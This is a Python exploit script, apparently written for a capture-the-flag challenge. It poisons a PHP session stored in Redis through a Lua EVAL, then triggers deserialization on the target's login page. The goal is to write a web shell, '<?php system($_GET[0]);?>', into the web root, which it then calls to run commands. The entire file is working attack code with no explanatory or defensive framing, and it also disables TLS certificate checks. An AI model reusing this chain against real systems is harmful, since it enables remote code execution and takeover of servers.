#!/usr/bin/env python3
import sys, ssl, urllib.request, urllib.error
import gen_payload
import redis_ctl

TARGET = "https://eci-2zean9adh9n9jct6jz9y.cloudeci1.ichunqiu.com:443"
SID = "QWBTESTCOOKIE1234567890ABCDEF"
SESSION_NAME = "ocq6ontx14as"
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE


def inject(filename, code):
    payload = gen_payload.build(filename, code)
    script = gen_payload.to_lua(payload)
    print("payload_bytes=%d script_bytes=%d" % (len(payload), len(script)))
    reply = redis_ctl.redis(6379, "EVAL", script, "1", "PHPREDIS_SESSION:" + SID)
    print("eval_reply=%r" % (reply,))
    print("strlen=%r" % (redis_ctl.redis(6379, "STRLEN", "PHPREDIS_SESSION:" + SID),))


def trigger():
    req = urllib.request.Request(
        TARGET + "/index.php/login",
        headers={
            "Cookie": "%s=%s" % (SESSION_NAME, SID),
            "User-Agent": "Mozilla/5.0 qwb2026",
        },
    )
    try:
        resp = urllib.request.urlopen(req, timeout=30, context=CTX)
        body = resp.read()
        print("trigger_status=%s bytes=%d" % (resp.status, len(body)))
        print("trigger_head=%r" % (body[:200],))
    except urllib.error.HTTPError as e:
        print("trigger_http=%s body=%r" % (e.code, e.read()[:300]))
    except Exception as e:
        print("trigger_err=%s" % (e,))


def fetch(path, show=600):
    req = urllib.request.Request(
        TARGET + path, headers={"User-Agent": "Mozilla/5.0 qwb2026"}
    )
    try:
        resp = urllib.request.urlopen(req, timeout=30, context=CTX)
        body = resp.read()
        print("fetch %s -> %s bytes=%d" % (path, resp.status, len(body)))
        print(repr(body[:show]))
        return body
    except urllib.error.HTTPError as e:
        body = e.read()
        print("fetch %s -> HTTP %s bytes=%d" % (path, e.code, len(body)))
        print(repr(body[:show]))
        return body
    except Exception as e:
        print("fetch %s -> ERR %s" % (path, e))
        return b""


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "check":
        fetch(sys.argv[2], show=300)
        sys.exit()
    filename = sys.argv[1] if len(sys.argv) > 1 else "/var/www/html/qwbshell.php"
    code = sys.argv[2] if len(sys.argv) > 2 else "<?php system($_GET[0]);?>"
    inject(filename, code)
    trigger()
    fetch("/qwbshell.php?0=id", show=600)
